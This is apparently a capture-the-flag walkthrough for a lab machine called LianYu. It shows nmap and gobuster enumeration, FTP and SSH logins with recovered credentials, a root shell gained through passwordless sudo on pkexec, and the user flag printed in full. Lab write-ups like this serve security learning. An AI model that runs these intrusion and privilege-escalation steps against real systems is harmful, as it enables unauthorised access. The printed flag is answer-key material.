🔍 Phase 1: Enumeration
--

 Network Scanning
I started with an **Nmap** scan to identify open services:


nmap -sV 10.48.186.153
Port 21: FTP (vsFTPd 3.0.2)

Port 22: SSH

Port 80: HTTP (Apache)

Web Directory Discovery
Using Gobuster, I found a hidden directory path:


gobuster dir -u [http://10.48.186.153/island](http://10.48.186.153/island) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
Path found: /island/2100

Information Gathering
Code Word: Found vigilante in the HTML source of the main page.

Hidden Token: Found a file at /island/2100/green_arrow.ticket containing: RTy8yhBQdscX.

 Phase 2: Gaining Access
 --
Decryption
Using CyberChef, I decoded the token from Base58:

Encoded: RTy8yhBQdscX

Decoded: !#th3h00d

FTP Data Extraction
I logged into FTP using vigilante / !#th3h00d and downloaded ss.zip. After unzipping, I found the file shado.

Credential Found: M3tahuman

 Phase 3: User Access
 --
SSH Login
I accessed the machine via SSH as the user slade:


ssh slade@10.48.186.153
# Password: M3tahuman
User Flag

cat user.txt
# THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}

Phase 4: Privilege Escalation (Root)
--
Sudo Privileges
Checking for sudo permissions:


slade@LianYu:~$ sudo -l
The user can run /usr/bin/pkexec as root without a password.

Exploitation
Using the GTFOBins technique to spawn a root shell:


sudo /usr/bin/pkexec /bin/sh
Root Flag

whoami # root
cat /root/root.txt

Tools Used
--
Nmap (Scanning)

Gobuster (Directory Brute-forcing)

CyberChef (Decoding)

FTP/SSH (Access)
